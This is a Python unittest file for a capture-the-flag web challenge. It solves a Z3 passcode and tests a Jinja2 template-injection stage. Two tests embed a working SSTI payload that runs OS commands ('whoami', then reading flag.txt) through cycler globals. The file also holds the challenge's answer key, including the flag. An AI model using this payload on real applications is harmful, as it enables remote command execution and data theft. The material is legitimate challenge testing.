import os
import sys
import unittest
from starlette.testclient import TestClient

# Add challenge root to path
CHALLENGE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, CHALLENGE_DIR)
sys.path.insert(0, os.path.join(CHALLENGE_DIR, "solvers"))

import app as challenge_app
from solve_z3_passcode import solve_quantum_passcode

class TestQuantumVaultChallenge(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.client = TestClient(challenge_app.app)
        cls.passcode = solve_quantum_passcode()

    def test_01_spec_endpoint(self):
        """Verify challenge specification and constraint exposure."""
        res = self.client.get("/api/vault/spec")
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertEqual(data.get("format"), "16-byte ASCII key")
        self.assertIn("constraints", data)
        self.assertEqual(len(data["constraints"]), 9)

    def test_02_invalid_passcode_rejected(self):
        """Verify invalid passcodes are rejected."""
        res = self.client.post("/api/vault/unlock", json={"passcode": "invalid_passcode"})
        self.assertEqual(res.status_code, 403)
        data = res.json()
        self.assertFalse(data.get("success"))
        self.assertIn("Quantum Passcode Invalid", data.get("error", ""))

    def test_03_z3_passcode_unlocks_stage_1(self):
        """Verify Z3 solver derived passcode unlocks stage 1."""
        self.assertIsNotNone(self.passcode)
        res = self.client.post("/api/vault/unlock", json={"passcode": self.passcode})
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertTrue(data.get("success"))
        self.assertIn("auth_token", data)
        self.__class__.auth_token = data["auth_token"]

    def test_04_waf_blocks_raw_ssti_in_hardened_mode(self):
        """Verify Google CTF WAF blocks dangerous attribute traversal."""
        challenge_app.HARDNESS_MODE = "google_ctf_hard"
        malicious_payload = "{{ cycler.__init__.__globals__.os.popen('whoami').read() }}"
        res = self.client.post("/api/vault/audit", json={
            "auth_token": self.__class__.auth_token,
            "signature": malicious_payload
        })
        self.assertEqual(res.status_code, 400)
        data = res.json()
        self.assertEqual(data.get("status"), "blocked")
        self.assertIn("WAF Blocked", data.get("waf_alert"))

    def test_05_exploit_succeeds_in_lenient_mode(self):
        """Verify SSTI vulnerability successfully extracts flag in lenient mode."""
        challenge_app.HARDNESS_MODE = "medium"
        flag_file = os.path.join(CHALLENGE_DIR, "flag.txt").replace("\\", "\\\\")
        cmd = f'type "{flag_file}"' if os.name == "nt" else f'cat "{flag_file}"'
        payload = f"{{{{ cycler.__init__.__globals__.os.popen('{cmd}').read() }}}}"

        res = self.client.post("/api/vault/audit", json={
            "auth_token": self.__class__.auth_token,
            "signature": payload
        })
        self.assertEqual(res.status_code, 200, f"Error: {res.text}")
        data = res.json()
        self.assertEqual(data.get("status"), "success")
        self.assertIn("HQX{g00gl3_ctf_qu4ntum_v4ult_z3_ssti_pwn3d_2026}", data.get("rendered_signature", ""))

if __name__ == "__main__":
    unittest.main()
